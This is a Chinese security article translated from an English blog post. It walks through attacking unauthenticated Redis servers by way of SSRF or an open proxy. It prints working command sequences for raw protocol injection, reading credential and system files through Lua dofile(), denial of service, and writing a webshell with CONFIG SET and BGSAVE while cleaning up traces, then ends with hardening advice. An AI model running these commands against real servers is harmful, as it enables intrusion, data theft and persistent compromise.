# Trying to hack Redis via HTTP requests

2014/09/23 18:54 | [我是壮丁](http://drops.wooyun.org/author/我是壮丁 "由 我是壮丁 发布") | [技术分享](http://drops.wooyun.org/category/tips "查看 技术分享 中的全部文章"), [漏洞分析](http://drops.wooyun.org/category/papers "查看 漏洞分析 中的全部文章") | 占个座先 | 捐赠作者

## 0x00 写在前面的话

* * *

文章是翻译过来的，翻译过程中做了一些修改，添加了些东西。有兴趣的直接可以看原文,原文的链接接在文章的最底部。

## 0x01 情景

* * *

我们假设存在一个 SSRF 漏洞或者配置不当的代理服务器，使攻击者可以通过 HTTP 请求直接访问 Redis 服务。在上面假设的两种情况中，要求我们对于 HTTP 的访问请求至少有一行是完全可控的，这种完全可控是很容易实现的。但是,命令行的客户端(redis-cli)是不支持 HTTP 代理的，而且我们需要构造出自己的命令。这些构造好的语句，封装在 HTTP 请求中，通过代理进行发送。以下所有的测试都是在 redis 2.6.0 版本中,虽然不是最新版，但是我们的要攻击的目标使用的就是这个版本......

## 0x02 Redis 简介

* * *

Redis 是一个 NoSQL 的数据库(NoSQl 泛指非关系型的数据库,常用的 mysql 是关系型数据库)，数据通过键/值对存储在内存中。默认配置中，在服务运行的时候，会开放一个没有验证的 TCP/6379 端口，提供的这个接口是很“宽容”。它会尝试去解析处理每一次输入(直到超时或者输入’QUIT’命令退出)，对于那些不存在的命令，则会显示像"-ERR unknown command"这样的输出。

## 0x03 目标识别

* * *

当我们利用 SSRF 漏洞或者配置不当的代理服务器进行进一步渗透时，第一步通常是扫描已知的服务。作为一个攻击者，得知这个服务只在本地回环接口上进行了端口监听，使用了基于来源的验证或者认为这种保护方式风险很小，因为这个是外部不能访问的。
在测试过程中，看到以下日志会令人亢奋：

```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:' 
```

正如你所看到的，这个输出证明了 HTTP 的 GET 请求方法，在 redis 中作为一个有效的命令执行了，但是没有给这个命令提供正确的参数。其他的 HTTP 请求的没有匹配到 Redis 命令，出现了很多”unknown command”的错误信息。

## 0x04 基本交互

* * *

在上面构造的场景中，发出去的 HTTP 请求是几乎完全可控的，同时请求是通过 Squid 代理发送的。
这包含以下两个方面

1)构造的 HTTP 请求必须是有效的,这样才能通过 squid 代理去处理请求
2)到达 Redis 数据库的请求，是通过代理发送的
更简单的方法是使用 POST 来提交数据，但是注入 HTTP 头部的也是一个不错的选择。现在，来输入一些基础的命令(蓝色标记的是输入的命令)

```
ECHO HELLO
$5
HELLO

TIME
*2
$10
1410273409
$6
380112

CONFIG GET pidfile
*2
$7
pidfile
$18
/var/run/redis.pid

SET my_key my_value
+OK

GET my_key
$8
my_value

QUIT
+OK 
```

## 0x05 突破空格的限制

* * *

正如你所注意到的,服务器会返回特定的数据,再加上像”*2”或者”$7”这种的字符,这是根据 Redis 协议对二进制数据安全的规定返回的数据，如果你要使用包含空格的参数,则必须使用这个规则。

例如,命令 SET 设置 key 为“foo bar”无论是否使用单双引号，都是不会成功的。幸运的是，Redis 协议关于二进制安全的一些规定是很简单的：

```
--每一行都要使用分隔符(CRLF)
--一条命令用”*”开始，同时用数字作为参数，需要分隔符(“*1”+ CRLF)
--我们有多个参数时：
-字符：以”$”开头+字符的长度（＂$4＂+CRLF）+字符串(“TIME”+CRLF)
-整数：以”:”开头+整数的 ASCII 码(“:42”+CRLF) 
```

以上就是所有规则

举一个例子：
对于设置”I am boring”的 key 为”with_space”，使用 redis-cli 的设置很简单，一眼就能看懂

```
$ redis-cli -h 127.0.0.1 -p 6379 set with_space 'I am boring'
+OK 
```

接下来我们套用规则来设置这条命令
*3 是 set 命令的代表
然后根据多个参数时的字符串表达式来构造 set with_space I am boring 这个命令，上面这条命令等价与后面的这条命令

```
$ echo -e  '*3\r\n$3\r\nSET\r\n$10\r\nwith_space\r\n$11\r\nI am boring\r\n' | nc -n -q 1 127.0.0.1 6379 
+OK 
```

## 0x06 信息收集

* * *

经过前面的铺垫，我们可以很好的和服务器进行交互获取我们想要的信息。Redis 的一些命令是很有用的，例如”INFO”和”CONFIG GET (dir|dbfilename|logfile|pidfile)＂。这里就把测试机器上的执行＂INFO＂的输出贴出来

```
# Server
redis_version:2.6.0
redis_git_sha1:00000000
redis_git_dirty:0
redis_mode:standalone
os:Linux 3.2.0-61-generic-pae i686
arch_bits:32
multiplexing_api:epoll
gcc_version:4.6.3
process_id:19114
run_id:5a29a860ccbe05b43dbe15c0674fb83df0449b25
tcp_port:6379
uptime_in_seconds:9806
uptime_in_days:0
lru_clock:518932

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:1
blocked_clients:0

# Memory
used_memory:661768
[...] 
```

下一步当然是进军文件系统，Redis 可以执行 Lua 脚本(在沙箱中)通过”EVAL”命令。沙箱允许 dofile()命令。这条命令能够查看文件和列目录。因为 Redis 没有特殊的权限，所以请求/etc/shadow 时会显示一个”permission denied”的错误信息（与运行 redis 服务的用户的权限有关）

```
EVAL “ return dofile('/etc/passwd')” 0
-ERR Error running script (call to f_afdc51b5f9e34eced5fae459fc1d856af181aaf1): /etc/passwd:1: function arguments expected near ':' 

EVAL “return dofile('/etc/shadow')” 0
-ERR Error running script (call to f_9882e931901da86df9ae164705931dde018552cb): cannot open /etc/shadow: Permission denied

EVAL “return dofile('/var/www/') ” 0
-ERR Error running script (call to f_8313d384df3ee98ed965706f61fc28dcffe81f23): cannot read /var/www/: Is a directory

EVAL “return dofile('/var/www/tmp_upload/') ”0
-ERR Error running script (call to f_7acae0314580c07e65af001d53ccab85b9ad73b1): cannot open /var/www/tmp_upload/: No such file or directory

EVAL “return dofile('/home/ubuntu/.bashrc')” 0
-ERR Error running script (call to f_274aea5728cae2627f7aac34e466835e7ec570d2): /home/ubuntu/.bashrc:2: unexpected symbol near '#' 
```

如果 Lua 脚本有语法错误或者尝试设置全局变量时，会产生报错信息，可以获得一些我们想要的信息

```
EVAL “return dofile('/etc/issue')” 0
-ERR Error running script (call to f_8a4872e08ffe0c2c5eda1751de819afe587ef07a): /etc/issue:1: malformed number near '12.04.4'

EVAL “return dofile('/etc/lsb-release')” 0
-ERR Error running script (call to f_d486d29ccf27cca592a28676eba9fa49c0a02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable 'Ubuntu'

EVAL “return dofile('/etc/hosts')” 0
-ERR Error running script (call to f_1c25ec3da3cade16a36d3873a44663df284f4f57): /etc/hosts:1: malformed number near '127.0.0.1' 
```

还有一种情况，但是并不是很常见，就是调用 dofile()这个函数去处理有效的 Lua 文件，然后返回提前定义好的值，假设这里有一个文件/var/data/app/db.conf

```
db = {
   login  = 'john.doe',
   passwd = 'Uber31337',
} 
```

通过 Lua 脚本得到 passwd 的值

```
EVAL dofile('/var/data/app/db.conf');return(db.passwd); 0 
+OK Uber31337 
```

这个也可以获取 Unix 标准文件的一些信息：

```
EVAL “dofile('/etc/environment');return(PATH);” 0       
+OK     /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
EVAL “dofile('/home/ubuntu/.selected_editor');return(SELECTED_EDITOR);” 0
+OK /usr/bin/nano 
```

## 0x07 暴力破解

* * *

Redis 提供一个 redis.sha1hex()函数，可以被 Lua 脚本调用，所以还可以通过 Redis 服务器进行 SHA-1 的破解，相关代码在 adam_baldwin 的 GitHub 上(https://github.com/evilpacket/redis-sha-crack)，相关原理的描述在
(http://fr.slideshare.net/evilpacket/ev1lsha-misadventures-in-the-land-of-lua 需要翻墙访问)

## 0x08 Dos

* * *

这里有很多 Dos Redis 的方法，例如通过调用 shutdown 这个命令删除数据。

这里有更加有趣的两个例子：

1)在 Redis 的控制端，调用 dofile()不加任何参数，将会从标准输入读取数据，并把读取的数据认为是 Lua 脚本。这个时候服务器依旧在运行，但是不会去处理新的连接，直到在控制端读取到”^D”(或者重启)。

2)Sha1hex()函数可以被覆盖(在任何一个客户端都可以实现这个效果)。下面展示一个返回固定值的 sha1hex()函数
Lua 脚本：

```
print(redis.sha1hex('secret'))
function redis.sha1hex (x)
   print('4242424242424242424242424242424242424242') 
end
print(redis.sha1hex('secret')) 
```

在 Redis 的控制端上

```
# First run
e5e9fa1ba31ecd1ae84f75caaa474f3a663f05f4
4242424242424242424242424242424242424242

# Next runs
4242424242424242424242424242424242424242
4242424242424242424242424242424242424242 
```

## 0x09 数据窃取

* * *

如果 Redis 服务器存储一些有趣的数据(像 session cookie 或商业数据)，你可以通过 get 枚举键值，获取数据。

## 0x0A 加密

* * *

Lua 使用完全可以预测的”随机数”，细节在 scripting.c 的 evalGenericCommand()函数中

```
/* We want the same PRNG sequence at every call so that our PRNG is* not affected by external state. */
redisSrand48(0); 
```

每一次 Lua 脚本调用 math.random()函数产生的随机数都是相同数字流：

```
0.17082803611217
0.74990198051087
0.09637165539729
0.87046522734243
0.57730350670279
[...] 
```

## 0x0b 远程命令执行

* * *

为了在开放的 Redis 服务器上进行命令执行，有以下三种情况：
首先能够修改底层的字节码,能够进行虚拟机的逃逸。(Lua 的一个例子 https://gist.github.com/corsix/6575486)；或者是绕过全局保护并且试图访问一些有趣的函数。

绕过全局保护是很轻松的(stackoverflow 上有一个例子

http://stackoverflow.com/questions/19997647/script-attempted-to-create-global-variable)。然而这么有趣的模块并不能加载,顺便提一下，在这里还有很多有趣的东西(http://lua-users.org/wiki/SandBoxes)。

第三种情况相对来说比较容易实现，将一个半控制的文件导出到硬盘中，在 web 的根目录中，通过备份得到一个 webshell 或者覆盖一个 shell 脚本。唯一的区别是文件名和 payload，导出的方法都是一样的，但是应该注意的是保存日志文件的位置在启动之后是不能修改的。事实上，这个数据库中的内容会隔一段时间备份到硬盘的，以便于数据恢复，何时备份取决于配置文件或者 BGSAVE 命令

以下是常用的几条命令:
-修改备份文件的位置

```
CONFIG SET dir /var/www/uploads
CONGIG SET dbfilename sh.php 
```

-把 payload 插入数据库

```
SET payload “could be php or shell or whatever” 
```

-把数据导出到硬盘

```
BGSAVE 
```

-清除痕迹

```
DEL payload
CONFIG SET dir /var/redis
CONGIG SET dbfilename dump.rdb 
```

然而，这里存在一个致命的问题，Redis 对 dump 出来的数据设置的是”0600”权限，因此 Apache 不能读取。（作者是这么写的,元芳你怎么看？）

## 0x0C 关于如何发觉公网上的 Redis 未授权访问

* * *

Redis 默认是运行在 TCP 的 6379 端口上的，需要进行端口扫描.确定端口是否开放。
同时，Python 中有 redis 这个模块，可以编写脚本调用端口扫描后的结果，对 Redis 服务是否可以直接访问,进行快速判断。

## 0x0D 安全配置 Redis 的一些建议

* * *

在配置文件中：

```
配置 port，修改端口号。
配置 bind 选项，限定可以连接 Redis 服务器的 IP。
配置 requirepass 选项，设置密码。
配置 rename-command CONFIG ""，禁用一些命令。 
```

源文章:

http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html

参考:
Redis protocol：http://redis.io/topics/protocol
Redis 命令参考：http://redis.readthedocs.org/en/latest/

版权声明：未经授权禁止转载 [我是壮丁](http://drops.wooyun.org/author/我是壮丁 "由 我是壮丁 发布")@[乌云知识库](http://drops.wooyun.org)

分享到：

### 相关日志

*   [Tor 隐身大法 —— 用 Tor 来帮助我们进行渗透测试](http://drops.wooyun.org/tips/1226)
*   [远程备份数据库和文件的方法](http://drops.wooyun.org/tips/783)
*   [One git command may cause you hacked(CVE-2014-9390)](http://drops.wooyun.org/papers/4386)
*   [下载文件的 15 种方法](http://drops.wooyun.org/tips/2420)
*   [Memcache 安全配置](http://drops.wooyun.org/papers/865)
*   [WordPress < 3.6.1 PHP 对象注入漏洞](http://drops.wooyun.org/papers/596)